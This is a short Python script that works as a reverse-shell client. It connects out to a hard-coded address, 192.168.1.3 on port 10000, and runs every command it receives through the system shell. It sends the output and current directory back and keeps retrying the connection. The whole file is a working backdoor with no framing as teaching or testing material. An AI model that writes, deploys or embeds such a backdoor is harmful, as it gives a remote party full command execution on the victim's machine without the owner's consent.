import socket
import os
import subprocess
import time

host = '192.168.1.3'
port = 10000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

## trying to connect to the server
def connect() :
    global s
    try :
        s.connect( (host, port) )
        
        while True :
            data = s.recv(1024)
            
            if data.decode()[:2] == 'cd' :
                os.chdir(data.decode()[3:])
            if len(data) > 0:
                cmd = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes)
                cwdir = os.getcwd()
                msg = str.encode(output_str + ' ' + cwdir)
                s.send(msg)
    except socket.error as err :
        print('Socket Erro :', err)
        time.sleep(5)
        connect()


if __name__ == '__main__' :
    connect()
